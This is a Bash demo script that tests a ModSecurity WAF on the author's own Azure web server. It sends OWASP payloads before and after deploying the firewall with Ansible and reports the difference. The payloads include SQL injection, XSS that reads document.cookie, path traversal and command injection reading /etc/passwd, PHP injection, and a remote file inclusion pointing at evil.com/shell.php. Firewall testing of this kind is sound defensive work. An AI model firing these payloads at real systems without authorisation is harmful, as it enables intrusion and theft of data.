#!/usr/bin/env bash
# ============================================================
# demo-4-modsecurity.sh
# Demonstrates ModSecurity WAF — OWASP attack blocked before/after
#
# Usage (from ~/ansible/):
#   ./scripts/demo-4-modsecurity.sh
# ============================================================

set -euo pipefail

DOMAIN="mediasrl.swedencentral.cloudapp.azure.com"
ANSIBLE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
DEMO_DIR="${ANSIBLE_DIR}/logs"
BEFORE_FILE="${DEMO_DIR}/modsecurity-before.txt"
AFTER_FILE="${DEMO_DIR}/modsecurity-after.txt"
TARGET_HOST="vm-web-01"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
HTML_FILE="${DEMO_DIR}/demo-4-modsecurity-${TIMESTAMP}.html"
DEMO_START=$SECONDS

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

mkdir -p "$DEMO_DIR"
cd "$ANSIBLE_DIR"

banner() {
    echo -e "\n${CYAN}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║  $1${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════╝${NC}\n"
}

log()  { echo -e "${GREEN}[$(date +%H:%M:%S)] $*${NC}"; }
warn() { echo -e "${YELLOW}[$(date +%H:%M:%S)] $*${NC}"; }

run_attack_tests() {
    local label="$1"
    local output_file="$2"

    {
        echo "  === OWASP Attack Tests — ${label} ==="
        echo "  Target: https://${DOMAIN}"
        echo ""

        declare -A ATTACKS=(
            ["SQL Injection (UNION)"]="/?id=1+UNION+SELECT+1,user(),3--"
            ["SQL Injection (OR 1=1)"]="/?search=admin'+OR+'1'='1"
            ["XSS (script tag)"]="/?q=<script>alert(document.cookie)</script>"
            ["XSS (img onerror)"]="/?name=<img+src=x+onerror=alert(1)>"
            ["Path Traversal"]="/?file=../../../../etc/passwd"
            ["Remote File Inclusion (RFI)"]="/?page=http://evil.com/shell.php"
            ["Command Injection"]="/?cmd=;cat+/etc/passwd"
            ["PHP Injection (<?php)"]="/?p=<?php+phpinfo();"
        )

        for attack_name in "${!ATTACKS[@]}"; do
            PAYLOAD="${ATTACKS[$attack_name]}"
            URL="https://${DOMAIN}${PAYLOAD}"

            TMP_HDR=$(mktemp)
            TMP_BODY=$(mktemp)
            # -L follows redirects; -D dumps headers; final code from -w
            CODE=$(curl -sLk --max-time 10 \
                -D "${TMP_HDR}" -o "${TMP_BODY}" \
                -w "%{http_code}" "${URL}" 2>/dev/null || echo "000")

            # Extract last status line (after redirects), Server, Content-Type, body title
            STATUS_LINE=$(grep "^HTTP/" "${TMP_HDR}" | tail -1 | tr -d '\r' || true)
            SRV_HDR=$(grep -i "^Server:" "${TMP_HDR}" | tail -1 | tr -d '\r' || true)
            CT_HDR=$(grep -i "^Content-Type:" "${TMP_HDR}" | tail -1 | tr -d '\r' || true)
            BODY_TITLE=$(head -c 2000 "${TMP_BODY}" 2>/dev/null \
                | grep -o '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1 || true)
            rm -f "${TMP_HDR}" "${TMP_BODY}"

            # Show command + raw response evidence
            echo ""
            echo "  $ curl -sLk \"${URL}\""
            [[ -n "${STATUS_LINE}" ]] && echo "    ${STATUS_LINE}"
            [[ -n "${SRV_HDR}" ]]     && echo "    ${SRV_HDR}"
            [[ -n "${CT_HDR}" ]]      && echo "    ${CT_HDR}"

            if [[ "$CODE" == "403" ]]; then
                [[ -n "${BODY_TITLE}" ]] && echo "    Body: ${BODY_TITLE}"
                echo -e "  ${GREEN}  ✓ [BLOCKED 403] ${attack_name}${NC}"
            elif [[ "$CODE" =~ ^(200|404|301|302)$ ]]; then
                [[ -n "${BODY_TITLE}" ]] && echo "    Body: ${BODY_TITLE}"
                echo -e "  ${RED}  ✗ [PASSED ${CODE}] ${attack_name}  ← NOT BLOCKED${NC}"
            else
                echo -e "  ${YELLOW}  ? [${CODE}] ${attack_name}${NC}"
            fi
        done
        echo ""

    } | tee "${output_file}"
}

# ── BEFORE ────────────────────────────────────────────────────────────────────

banner "STEP 1 — BEFORE: No WAF (Web Application Firewall) — all OWASP (Open Web Application Security Project) attacks pass through"
warn "SQL injection, XSS, path traversal etc. reach the application backend"
echo ""
run_attack_tests "BEFORE (no WAF)" "$BEFORE_FILE"

# ── APPLY HARDENING ───────────────────────────────────────────────────────────

banner "STEP 2 — Deploying ModSecurity WAF via Ansible"
warn "This may take 2-3 minutes (downloads OWASP CRS ~25MB)"
log "Running: ansible-playbook playbooks/harden-security.yml --tags modsecurity"
echo ""

PYTHONUNBUFFERED=1 ansible-playbook playbooks/harden-security.yml \
    --tags modsecurity \
    2>&1 | grep --line-buffered -E "(TASK|ok|changed|failed|PLAY RECAP|fatal)" | sed 's/^/  /'

echo ""
log "ModSecurity deployed. Waiting 8s for nginx reload..."
sleep 8

# ── AFTER ─────────────────────────────────────────────────────────────────────

banner "STEP 3 — AFTER: ModSecurity WAF active — OWASP CRS enforcing"
log "SecRuleEngine On — attacks blocked with HTTP 403 Forbidden"
echo ""
run_attack_tests "AFTER (ModSecurity + OWASP CRS)" "$AFTER_FILE"

# ── STEP 3b: VERBOSE PROOF (one full HTTP exchange) ───────────────────────────

PROOF_URL="https://${DOMAIN}/?id=1+UNION+SELECT+1,user(),3--"

banner "STEP 3b — Proof: full HTTP exchange for SQL Injection attack"
echo "  curl -ik '${PROOF_URL}'"
echo ""

# -i = include response headers in output; -k = skip cert verify
FULL_RESPONSE=$(curl -ik --max-time 10 "${PROOF_URL}" 2>/dev/null || true)
RESP_STATUS=$(echo "${FULL_RESPONSE}" | grep -oE "^HTTP/[0-9.]+ [0-9]+ .*" | head -1 || true)
RESP_SERVER=$(echo "${FULL_RESPONSE}" | grep -i "^Server:" | head -1 || true)
RESP_TYPE=$(echo "${FULL_RESPONSE}" | grep -i "^Content-Type:" | head -1 || true)
RESP_BODY_TITLE=$(echo "${FULL_RESPONSE}" | grep -o '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1 || true)
RESP_CODE=$(echo "${RESP_STATUS}" | grep -oE "[0-9]{3}" | head -1 || echo "000")

echo -e "  Response headers:"
echo -e "    ${BOLD}${RESP_STATUS}${NC}"
[[ -n "${RESP_SERVER}" ]]   && echo "    ${RESP_SERVER}"
[[ -n "${RESP_TYPE}" ]]     && echo "    ${RESP_TYPE}"
[[ -n "${RESP_BODY_TITLE}" ]] && echo "    Body title: ${RESP_BODY_TITLE}"
echo ""

if [[ "${RESP_CODE}" == "403" ]]; then
    echo -e "  ${GREEN}[CONFIRMED] HTTP 403 Forbidden — ModSecurity blocked the SQL Injection${NC}"
    echo -e "  ${GREEN}            Attack payload never reached the application backend${NC}"
else
    echo -e "  ${YELLOW}[INFO] Response: ${RESP_CODE} — verify WAF is active (SecRuleEngine On)${NC}"
fi

# ── STEP 3c: SERVER-SIDE AUDIT LOG EVIDENCE ───────────────────────────────────

echo ""
banner "STEP 3c — Server-side: ModSecurity block events in nginx logs"

echo "  [ERROR LOG] ModSecurity entries (nginx error.log):"
ansible "${TARGET_HOST}" -m shell \
    -a "COUNT=\$(grep -c 'ModSecurity' /var/log/nginx/error.log 2>/dev/null || echo 0)
        echo \"  Total ModSecurity block events: \${COUNT}\"
        grep 'ModSecurity' /var/log/nginx/error.log 2>/dev/null \
            | tail -3 \
            | grep -oE '\\[id \"[0-9]+\"\\].*\\[uri \"[^\"]+\"\\]' \
            | sed 's/^/    /' || true" \
    --become 2>/dev/null \
    | grep -v "^${TARGET_HOST}\b\|^WARNING\|^$\|^SUCCESS\|^CHANGED\|rc=[0-9]" || true

echo ""
echo "  [AUDIT LOG] /var/log/nginx/modsec_audit.log:"
ansible "${TARGET_HOST}" -m shell \
    -a "if [ -f /var/log/nginx/modsec_audit.log ]; then
          LINES=\$(wc -l < /var/log/nginx/modsec_audit.log)
          echo \"  File size: \${LINES} lines\"
          tail -5 /var/log/nginx/modsec_audit.log \
              | grep -oE '\"(uri|id|msg|severity)\":\"[^\"]*\"' \
              | sed 's/^/    /' || \
          tail -5 /var/log/nginx/modsec_audit.log | strings | grep -v '^$' | head -10 | sed 's/^/    /'
        else
          echo '  (file not found — check SecAuditLog in modsecurity.conf)'
        fi" \
    --become 2>/dev/null \
    | grep -v "^${TARGET_HOST}\b\|^WARNING\|^$\|^SUCCESS\|^CHANGED\|rc=[0-9]" || true

# ── DIFF ──────────────────────────────────────────────────────────────────────

banner "STEP 4 — DIFF: Before vs After"
echo -e "${YELLOW}--- BEFORE (attacks PASS)${NC}"
echo -e "${GREEN}+++ AFTER  (attacks BLOCKED)${NC}"
echo ""
diff --color=always "$BEFORE_FILE" "$AFTER_FILE" || true

echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║  DEMO COMPLETE — ModSecurity WAF                     ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Test manually:"
echo -e "    curl -k \"https://${DOMAIN}/?id=1+UNION+SELECT+1,2,3--\""
echo -e "    # Expected: 403 Forbidden"
echo ""
echo -e "  Watch WAF blocks live:"
echo -e "    ssh azureadmin@vm-web-01 'sudo tail -f /var/log/nginx/modsec_audit.log'"
echo ""

# Generate HTML report
DEMO_ELAPSED=$(( SECONDS - DEMO_START ))
python3 "${ANSIBLE_DIR}/scripts/lib/generate-demo-html.py" \
    --title        "ModSecurity WAF — OWASP CRS 3.2.1" \
    --subtitle     "SQLi, XSS, Path Traversal, RFI, Command Injection — toate blocate cu HTTP 403 Forbidden" \
    --before       "${BEFORE_FILE}" \
    --after        "${AFTER_FILE}" \
    --before-label "BEFORE — Fără WAF: atacurile OWASP ajung la backend (200/404)" \
    --after-label  "AFTER — ModSecurity activ: toate atacurile blocate cu 403 Forbidden" \
    --target       "${DOMAIN}" \
    --demo-num     4 \
    --duration     "${DEMO_ELAPSED}s" \
    --html         "${HTML_FILE}" || true
echo -e "    HTML Report: ${HTML_FILE}"
